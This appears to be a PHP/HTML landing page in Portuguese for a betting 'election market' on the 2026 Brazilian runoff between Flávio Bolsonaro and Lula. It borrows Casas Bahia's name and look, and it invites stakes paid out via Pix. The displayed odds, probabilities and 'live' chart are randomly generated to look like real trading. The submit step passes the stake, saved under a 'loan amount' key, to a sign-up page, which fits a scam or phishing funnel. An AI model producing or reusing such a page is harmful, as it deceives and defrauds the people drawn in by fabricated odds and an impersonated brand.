<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once 'db_config.php';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Eleitoral 2026 - Ofertas e Cotações Exclusivas</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Estilo Oficial Casas Bahia (Azul e Amarelo Varejo) */
        .cb-header { background-color: #0045df; }
        .cb-yellow { background-color: #ffe600; color: #001e62; }
        .cb-card {
            position: relative;
            background: #ffffff;
            border: 1px solid #e5e7eb;
            box-shadow: 0 10px 25px -5px rgba(0, 69, 223, 0.1);
        }
        /* Gráfico de Fundo Trader (Verde e Vermelho) */
        #bg-chart {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.12;
            pointer-events: none;
            z-index: 0;
        }
        .candidate-btn {
            transition: all 0.25s ease;
            border: 2px solid #e5e7eb;
            background-color: #f9fafb;
        }
        .candidate-btn.selected {
            border-color: #0045df;
            background-color: #eff6ff;
            box-shadow: 0 0 15px rgba(0, 69, 223, 0.2);
        }
        .value-chip {
            transition: all 0.2s ease;
        }
        .value-chip.active {
            background-color: #0045df;
            color: #ffffff;
            border-color: #0045df;
        }
        @keyframes pulse-fast {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.85; transform: scale(1.02); }
        }
        .cb-pulse {
            animation: pulse-fast 1.5s infinite;
        }
    </style>
</head>
<body class="bg-slate-100 min-h-screen font-sans text-gray-950 flex flex-col justify-between">

    <!-- Topo Casas Bahia -->
    <header class="cb-header text-white text-xs py-3 px-4 shadow-md relative z-10">
        <div class="max-w-xl mx-auto flex justify-between items-center">
            <div class="flex items-center gap-2">
                <span class="bg-[#ffe600] text-[#001e62] font-extrabold px-2 py-0.5 rounded text-[11px] uppercase tracking-tighter">Especial 2026</span>
                <span class="font-bold tracking-wide">MERCADO ELEITORAL • BOLSA DE APOSTAS</span>
            </div>
            <span class="text-amber-300 font-extrabold flex items-center gap-1 bg-blue-900/40 px-2 py-1 rounded">
                <i class="fa-solid fa-bolt text-amber-300"></i> AO VIVO (120 FPS)
            </span>
        </div>
    </header>

    <!-- Conteúdo Principal -->
    <main class="max-w-xl w-full mx-auto p-4 my-auto space-y-4 relative z-10">

        <!-- Banner / Título -->
        <div class="text-center space-y-1 mb-1">
            <div class="inline-block bg-red-600 text-white font-extrabold text-[10px] uppercase px-3 py-0.5 rounded-full mb-1 shadow-sm cb-pulse">
                🔥 Oferta Relâmpago - Cotações em Tempo Real
            </div>
            <h1 class="text-xl md:text-2xl font-black text-[#001e62]">Quem vence o 2º Turno em 2026?</h1>
            <p class="text-xs text-gray-600 font-medium">Garanta sua posição no mercado, apoie seu candidato e multiplique seu palpite.</p>
        </div>

        <div class="cb-card rounded-2xl p-5 shadow-xl space-y-5">
            <!-- Canvas do Gráfico Verde e Vermelho ao Fundo -->
            <canvas id="bg-chart"></canvas>

            <div class="relative z-10 space-y-5">
                <!-- Passo 1: Escolher Candidato + Odds e Chances -->
                <div class="space-y-2.5">
                    <div class="flex justify-between items-center">
                        <label class="block text-xs font-bold text-gray-800 uppercase tracking-wider">
                            1. Escolha seu Candidato:
                        </label>
                        <span id="market-trend-msg" class="text-[10px] text-red-600 font-bold italic animate-pulse">⚡ Mercado em alta volatilidade</span>
                    </div>
                    
                    <div class="grid grid-cols-2 gap-3">
                        
                        <!-- Flávio Bolsonaro -->
                        <button type="button" onclick="selecionarCandidato('Flávio Bolsonaro')" id="cand-flavio" class="candidate-btn p-3 rounded-xl text-left flex flex-col justify-between">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center gap-2">
                                    <img src="https://legis.senado.leg.br/senadores/fotos-oficiais/5894" alt="Flávio Bolsonaro" class="w-8 h-8 rounded-full object-cover border border-gray-300 pointer-events-none">
                                    <span class="text-xs font-bold text-gray-900">Flávio Bolsonaro</span>
                                </div>
                                <span id="odds-flavio-badge" class="text-[10px] bg-emerald-100 text-emerald-700 font-black px-1.5 py-0.5 rounded border border-emerald-300">Odds 4.20x</span>
                            </div>
                            <div class="space-y-1">
                                <div class="flex justify-between text-[10px] text-gray-500 font-semibold">
                                    <span>Probabilidade:</span>
                                    <span class="font-bold text-gray-800 flex items-center gap-1">
                                        <span id="pct-flavio">50</span>%
                                    </span>
                                </div>
                                <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
                                    <div id="bar-flavio" class="bg-blue-600 h-full rounded-full transition-all duration-300" style="width: 50%;"></div>
                                </div>
                            </div>
                        </button>

                        <!-- Lula -->
                        <button type="button" onclick="selecionarCandidato('Lula')" id="cand-lula" class="candidate-btn p-3 rounded-xl text-left flex flex-col justify-between">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center gap-2">
                                    <img src="https://s2-oglobo.glbimg.com/X_BdUZCQ5eAs1JGzbVO0xByP-DY=/0x268:1990x1866/888x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_da025474c0c44edd99332dddb09cabe8/internal_photos/bs/2026/L/U/q8zyg5Sguu3nOXvcDLrw/55450527845-c28450c581-k.jpg" alt="Lula" class="w-8 h-8 rounded-full object-cover border border-gray-300 pointer-events-none">
                                    <span class="text-xs font-bold text-gray-900">Lula</span>
                                </div>
                                <span id="odds-lula-badge" class="text-[10px] bg-emerald-100 text-emerald-700 font-black px-1.5 py-0.5 rounded border border-emerald-300">Odds 3.40x</span>
                            </div>
                            <div class="space-y-1">
                                <div class="flex justify-between text-[10px] text-gray-500 font-semibold">
                                    <span>Probabilidade:</span>
                                    <span class="font-bold text-gray-800 flex items-center gap-1">
                                        <span id="pct-lula">50</span>%
                                    </span>
                                </div>
                                <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
                                    <div id="bar-lula" class="bg-red-600 h-full rounded-full transition-all duration-300" style="width: 50%;"></div>
                                </div>
                            </div>
                        </button>

                    </div>
                </div>

                <!-- Passo 2: Valor do Palpite -->
                <div class="space-y-2">
                    <label class="block text-xs font-bold text-gray-800 uppercase tracking-wider">
                        2. Valor do Palpite (R$):
                    </label>

                    <!-- Atalhos de Valores -->
                    <div class="grid grid-cols-4 gap-2">
                        <button type="button" onclick="definirValor(50, this)" class="value-chip py-2 bg-white border border-gray-300 rounded-lg text-xs font-bold text-gray-800 hover:bg-gray-50 active">R$ 50</button>
                        <button type="button" onclick="definirValor(100, this)" class="value-chip py-2 bg-white border border-gray-300 rounded-lg text-xs font-bold text-gray-800 hover:bg-gray-50">R$ 100</button>
                        <button type="button" onclick="definirValor(250, this)" class="value-chip py-2 bg-white border border-gray-300 rounded-lg text-xs font-bold text-gray-800 hover:bg-gray-50">R$ 250</button>
                        <button type="button" onclick="definirValor(500, this)" class="value-chip py-2 bg-white border border-gray-300 rounded-lg text-xs font-bold text-gray-800 hover:bg-gray-50">R$ 500</button>
                    </div>

                    <!-- Input Personalizado -->
                    <div class="relative mt-2">
                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-gray-500 text-sm font-bold">R$</span>
                        <input type="number" id="valorPersonalizado" value="50" placeholder="Outro valor (Ex: 100)" class="w-full bg-white border border-gray-300 rounded-xl pl-10 pr-4 py-3 text-sm text-gray-900 focus:outline-none focus:border-blue-700 font-bold" oninput="removerAtivoChips(); calcularRetorno();">
                    </div>
                </div>

                <!-- Resumo do Prêmio Potencial (Estilo Carrinho Varejo) -->
                <div id="painelRetorno" class="bg-blue-50 border-2 border-blue-600 rounded-xl p-3.5 flex items-center justify-between text-xs transition-all">
                    <div>
                        <span class="text-blue-900 block text-[10px] uppercase font-black">Retorno Estimado no Pix:</span>
                        <span id="textoRetorno" class="text-lg font-black text-emerald-700">R$ 170,00</span>
                    </div>
                    <div class="text-right">
                        <span class="text-blue-900 block text-[10px] uppercase font-black">Multiplicador:</span>
                        <span id="textoOdds" class="text-sm font-black text-blue-700">3.40x</span>
                    </div>
                </div>

                <!-- Botão de Avançar (Amarelo Casas Bahia) -->
                <button type="button" onclick="avancarCadastro()" class="w-full cb-yellow hover:opacity-95 font-black py-4 px-4 rounded-xl transition shadow-lg flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
                    <span>Comprar Palpite Agora</span>
                    <i class="fa-solid fa-arrow-right text-xs"></i>
                </button>
            </div>

        </div>

    </main>

    <!-- Rodapé -->
    <footer class="text-center text-[10px] text-gray-500 py-3 relative z-10 bg-white border-t border-gray-200">
        Casas Bahia Eleitoral 2026 • Plataforma simulada de negociação de cenários políticos.
    </footer>

    <script>
        let candidatoSelecionado = "Lula";
        let multiplicadorAtual = 3.40;

        let currentFlavioPct = 50;
        let currentLulaPct = 50;
        let currentFlavioOdds = 4.20;
        let currentLulaOdds = 3.40;

        document.addEventListener('DOMContentLoaded', () => {
            const btnLula = document.getElementById('cand-lula');
            if (btnLula) btnLula.classList.add('selected');
            calcularRetorno();
        });

        function selecionarCandidato(nome) {
            candidatoSelecionado = nome;
            const btnFlavio = document.getElementById('cand-flavio');
            const btnLula = document.getElementById('cand-lula');
            
            if (nome === 'Flávio Bolsonaro') {
                multiplicadorAtual = currentFlavioOdds;
                if (btnFlavio) btnFlavio.classList.add('selected');
                if (btnLula) btnLula.classList.remove('selected');
            } else {
                multiplicadorAtual = currentLulaOdds;
                if (btnLula) btnLula.classList.add('selected');
                if (btnFlavio) btnFlavio.classList.remove('selected');
            }

            calcularRetorno();
        }

        function definirValor(valor, btnElement) {
            const inputVal = document.getElementById('valorPersonalizado');
            if (inputVal) inputVal.value = valor;

            let chips = document.querySelectorAll('.value-chip');
            chips.forEach(chip => chip.classList.remove('active'));
            if(btnElement) {
                btnElement.classList.add('active');
            }

            calcularRetorno();
        }

        function removerAtivoChips() {
            let chips = document.querySelectorAll('.value-chip');
            chips.forEach(chip => chip.classList.remove('active'));
        }

        function calcularRetorno() {
            const inputVal = document.getElementById('valorPersonalizado');
            const painel = document.getElementById('painelRetorno');
            if (!inputVal || !painel) return;

            let valorInput = parseFloat(inputVal.value);

            if (!candidatoSelecionado || isNaN(valorInput) || valorInput <= 0) {
                painel.classList.add('hidden');
                return;
            }

            let premioTotal = valorInput * multiplicadorAtual;
            
            const txtRetorno = document.getElementById('textoRetorno');
            const txtOdds = document.getElementById('textoOdds');
            
            if (txtRetorno) txtRetorno.innerText = "R$ " + premioTotal.toFixed(2).replace('.', ',');
            if (txtOdds) txtOdds.innerText = multiplicadorAtual.toFixed(2) + "x";
            painel.classList.remove('hidden');
        }

        // OSCILAÇÃO DINÂMICA COM DIFERENÇAS GARANTIDAS NAS ODDS (ATÉ 9.00X)
        setInterval(() => {
            currentFlavioPct = Math.min(70, Math.max(30, Math.round(currentFlavioPct + (Math.random() * 10 - 5))));
            currentLulaPct = 100 - currentFlavioPct;

            let novaOdd1 = Math.min(9.00, Math.max(1.80, parseFloat((currentFlavioOdds + (Math.random() * 0.80 - 0.40)).toFixed(2))));
            let novaOdd2 = Math.min(9.00, Math.max(1.80, parseFloat((currentLulaOdds + (Math.random() * 0.80 - 0.40)).toFixed(2))));

            if (Math.abs(novaOdd1 - novaOdd2) < 0.30) {
                novaOdd2 = parseFloat((novaOdd1 + 0.35 > 9.00 ? novaOdd1 - 0.35 : novaOdd1 + 0.35).toFixed(2));
            }

            currentFlavioOdds = novaOdd1;
            currentLulaOdds = novaOdd2;

            const badgeFlavio = document.getElementById('odds-flavio-badge');
            const pctFlavio = document.getElementById('pct-flavio');
            const barFlavio = document.getElementById('bar-flavio');
            if(badgeFlavio) badgeFlavio.innerText = 'Odds ' + currentFlavioOdds.toFixed(2) + 'x';
            if(pctFlavio) pctFlavio.innerText = currentFlavioPct;
            if(barFlavio) barFlavio.style.width = currentFlavioPct + '%';

            const badgeLula = document.getElementById('odds-lula-badge');
            const pctLula = document.getElementById('pct-lula');
            const barLula = document.getElementById('bar-lula');
            if(badgeLula) badgeLula.innerText = 'Odds ' + currentLulaOdds.toFixed(2) + 'x';
            if(pctLula) pctLula.innerText = currentLulaPct;
            if(barLula) barLula.style.width = currentLulaPct + '%';

            if (candidatoSelecionado === 'Flávio Bolsonaro') {
                multiplicadorAtual = currentFlavioOdds;
            } else {
                multiplicadorAtual = currentLulaOdds;
            }
            calcularRetorno();
        }, 3000);

        // GRÁFICO TRADER (VERDE E VERMELHO) OTIMIZADO A 120 FPS via requestAnimationFrame
        const canvas = document.getElementById('bg-chart');
        if (canvas) {
            const ctx = canvas.getContext('2d');
            function resizeCanvas() {
                canvas.width = canvas.parentElement.offsetWidth;
                canvas.height = canvas.parentElement.offsetHeight;
            }
            window.addEventListener('resize', resizeCanvas);
            resizeCanvas();

            let points = [];
            for(let i=0; i<45; i++) points.push({ y: Math.random() * canvas.height, bullish: Math.random() > 0.5 });

            let lastTime = 0;
            const fpsInterval = 1000 / 120; // 120 FPS target

            function drawChart(timestamp) {
                requestAnimationFrame(drawChart);

                let elapsed = timestamp - lastTime;
                if (elapsed < fpsInterval) return;
                lastTime = timestamp - (elapsed % fpsInterval);

                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                if (Math.random() < 0.2) {
                    points.shift();
                    let lastY = points[points.length - 1] ? points[points.length - 1].y : canvas.height / 2;
                    let newY = Math.max(15, Math.min(canvas.height - 15, lastY + (Math.random() * 50 - 25)));
                    let isBullish = newY < lastY;
                    points.push({ y: newY, bullish: isBullish });
                }

                let step = canvas.width / (points.length - 1);

                for(let i = 0; i < points.length - 1; i++) {
                    ctx.beginPath();
                    ctx.moveTo(i * step, points[i].y);
                    ctx.lineTo((i + 1) * step, points[i+1].y);
                    ctx.strokeStyle = points[i+1].bullish ? '#22c55e' : '#ef4444';
                    ctx.lineWidth = 1.8;
                    ctx.stroke();
                }
                
                ctx.lineTo(canvas.width, canvas.height);
                ctx.lineTo(0, canvas.height);
                ctx.fillStyle = 'rgba(34, 197, 94, 0.015)';
                ctx.fill();
            }
            requestAnimationFrame(drawChart);
        }

        function avancarCadastro() {
            const inputVal = document.getElementById('valorPersonalizado');
            let valorFinal = inputVal ? inputVal.value : 50;

            if (!candidatoSelecionado) {
                alert("Por favor, selecione um candidato para o seu palpite.");
                return;
            }

            if (!valorFinal || valorFinal <= 0) {
                alert("Por favor, informe ou selecione o valor do palpite.");
                return;
            }

            let premioEstimado = (valorFinal * multiplicadorAtual).toFixed(2);
            let servicoTexto = "Palpite 2º Turno: " + candidatoSelecionado + " (Valor: R$ " + valorFinal + " | Retorno Est: R$ " + premioEstimado + ")";

            localStorage.setItem('servico_escolhido', servicoTexto);
            localStorage.setItem('valor_emprestimo', valorFinal);
            localStorage.setItem('candidato_escolhido', candidatoSelecionado);
            localStorage.setItem('retorno_estimado', premioEstimado);

            window.location.href = 'cadastro.php?servico=' + encodeURIComponent(servicoTexto);
        }
    </script>
</body>
</html>